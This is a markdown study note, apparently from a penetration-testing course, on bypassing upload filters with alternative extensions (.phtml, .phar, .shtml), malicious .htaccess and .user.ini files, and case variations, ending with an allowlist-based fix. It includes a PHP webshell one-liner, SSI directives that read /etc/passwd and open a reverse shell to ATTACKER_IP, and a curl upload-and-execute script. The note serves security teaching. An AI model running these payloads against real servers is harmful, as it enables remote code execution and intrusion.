---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.04 Extension Bypass (.php5, .phtml, .phar, .shtml)"
portswigger_labs: ["Web shell upload via path traversal", "Web shell upload via obfuscated file extension"]
---

# 22.04 — Extension Bypass (.php5, .phtml, .phar, .shtml)

## Why Extensions Matter

```
SERVERS EXECUTE FILES BASED ON EXTENSION:
  Apache config: AddHandler application/x-httpd-php .php
  → Any file ending in .php → executed as PHP!
  
  BLOCKLIST APPROACH (wrong):
  Developer: "Block .php files!"
  → Blocks: .php
  → Doesn't block: .php5, .phtml, .php3, .phar, .shtml...
  → Attacker uploads shell.phtml → server executes as PHP!
  
  WHY BLOCKLISTS FAIL:
  Too many ways to trigger PHP execution
  Case sensitivity issues
  Server configuration variations
```

---

## PHP Alternative Extensions

```
ALL OF THESE CAN EXECUTE PHP CODE (server-dependent):
  .php          ← blocked (hopefully)
  .php3         ← old PHP 3 extension
  .php4         ← PHP 4
  .php5         ← PHP 5
  .php7         ← PHP 7 (some servers)
  .phtml        ← PHP-HTML hybrid (very common!)
  .phar         ← PHP archive (executes as PHP)
  .phps         ← PHP source (sometimes executed)
  .shtml        ← Server-Side Includes (can run PHP/commands)
  .cgi          ← CGI (if PHP CGI configured)
  
  CASE VARIATIONS (if case-insensitive):
  .PHP, .Php, .PHP5, .PHTML
  
  TEST APPROACH:
  Try each extension with your webshell content
  See which ones result in PHP execution vs. text display vs. error
```

---

## ASP.NET Alternative Extensions

```
ALL CAN EXECUTE ASP.NET CODE:
  .asp          ← Classic ASP
  .aspx         ← ASP.NET
  .ashx         ← Generic handler
  .asmx         ← Web service
  .axd          ← Handler
  .ascx         ← User control
  .master       ← Master page
  .config       ← Web.config (can define handlers)
  
  CASE VARIATIONS:
  .ASP, .ASPX, .Aspx
```

---

## Server-Side Includes (SSI)

```
.shtml / .shtm / .stm (Apache SSI):
  Server parses for <!-- #include --> and <!-- #exec --> directives!
  
  WEBSHELL VIA SSI:
  Create file: shell.shtml
  Content:
  <!--#exec cmd="id" -->
  
  Upload as shell.shtml
  Visit: https://target.com/uploads/shell.shtml
  → Server executes: id → renders output!
  
  MORE:
  <!--#exec cmd="cat /etc/passwd" -->
  <!--#exec cmd="bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" -->
  
  TEST:
  Upload .shtml file with SSI directives
  Visit → if "id" output appears → SSI RCE!
```

---

## .htaccess as Execution Enabler

```
CRITICAL TECHNIQUE: UPLOAD .htaccess FIRST!
  
  Apache reads .htaccess files in directories!
  If we upload a malicious .htaccess → change how Apache handles files in that directory!
  
  PAYLOAD 1: Make .jpg execute as PHP:
  AddType application/x-httpd-php .jpg
  
  Steps:
  1. Upload: .htaccess (with above content) → to /uploads/
  2. Upload: shell.jpg (with PHP content)
  3. Visit: /uploads/shell.jpg → Apache executes as PHP!
  
  PAYLOAD 2: Make all files PHP:
  SetHandler application/x-httpd-php
  
  PAYLOAD 3: Enable SSI:
  Options +Includes
  AddType text/html .png
  AddOutputFilter INCLUDES .png
  
  FILENAME IS LITERAL: ".htaccess" (starts with dot, no other extension)
  → Some upload filters only check extension after the dot
  → .htaccess has no extension after dot → might bypass!
  
  TESTING:
  Try uploading a file named: .htaccess
  Content: AddType application/x-httpd-php .jpg
  → Then upload shell.jpg → does it execute?
```

---

## PHP user.ini Technique (PHP-FPM/Nginx)

```
PHP USER.INI:
  Similar to .htaccess but for PHP-FPM
  PHP reads php.ini directives from user.ini files!
  
  PAYLOAD:
  Create: .user.ini
  Content: auto_prepend_file=shell.jpg
  
  Upload .user.ini → upload shell.jpg
  → PHP auto-prepends shell.jpg before every PHP file in that directory!
  → Visit ANY PHP page in that directory → shell.jpg executed!
  
  NOTE: .user.ini changes are cached (300 seconds by default)
  → Might need to wait before shell is active
```

---

## Testing Extension Bypasses

```bash
# GENERATE TEST FILES FOR ALL PHP EXTENSIONS:
EXTENSIONS=("php3" "php4" "php5" "php7" "phtml" "phar" "phps" "shtml")
WEBSHELL='<?php system($_GET["cmd"]); ?>'

for EXT in "${EXTENSIONS[@]}"; do
  echo "$WEBSHELL" > "shell.$EXT"
  echo "Created: shell.$EXT"
done

# UPLOAD EACH AND TEST:
for EXT in "${EXTENSIONS[@]}"; do
  # Upload (adjust URL and session):
  RESPONSE=$(curl -s -X POST https://target.com/upload \
    -b "session=YOUR_SESSION" \
    -F "file=@shell.$EXT;type=image/jpeg")
  echo "$EXT: $RESPONSE"
done

# FIND AND TEST EXECUTION:
UPLOAD_BASE="https://target.com/uploads"
for EXT in php php3 php4 php5 php7 phtml phar shtml; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$UPLOAD_BASE/shell.$EXT?cmd=id")
  CONTENT=$(curl -s "$UPLOAD_BASE/shell.$EXT?cmd=id")
  echo "$EXT ($CODE): $CONTENT" | head -1
done

# CASE SENSITIVITY TEST:
for EXT in PHP Php pHp PHP5 PHTML; do
  echo '<?php system($_GET["cmd"]); ?>' > "shell.$EXT"
  # Upload and test...
done

# .htaccess TEST:
# Create .htaccess:
echo "AddType application/x-httpd-php .jpg" > .htaccess
# Upload .htaccess file
curl -X POST https://target.com/upload \
  -b "session=YOUR_SESSION" \
  -F "file=@.htaccess;type=text/plain;filename=.htaccess"
# Then upload shell.jpg and test execution
```

---

## Fix

```
ALLOWLIST APPROACH (only correct solution):

# BAD: BLOCKLIST (always breakable):
BLOCKED = ['.php', '.asp', '.aspx']
if extension in BLOCKED:
    reject()

# GOOD: ALLOWLIST (strict):
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.webp'}
ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}

# Also: normalize extension to lowercase before checking
extension = Path(filename).suffix.lower()
if extension not in ALLOWED_EXTENSIONS:
    reject("File type not allowed")

# ALSO:
# Rename file to UUID + allowed extension:
import uuid
safe_filename = str(uuid.uuid4()) + '.jpg'  # Always .jpg, regardless of input

# Store outside web root:
# /var/app/uploads/ (not /var/www/html/uploads/)

# Configure Apache to not execute anything in uploads dir:
# <Directory /var/www/html/uploads>
#   Options -ExecCGI
#   RemoveHandler .php .asp .aspx .phtml .shtml
#   AddType text/plain .php .asp .aspx .phtml
# </Directory>
```

---

## Related Notes
- [[02 - Unrestricted File Upload — Webshell Upload]] — webshell upload
- [[03 - Content-Type Bypass]] — MIME type bypass
- [[05 - Double Extension (file.php.jpg)]] — double extension trick
- [[06 - Null Byte Injection (file.php%00.jpg)]] — null byte bypass
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
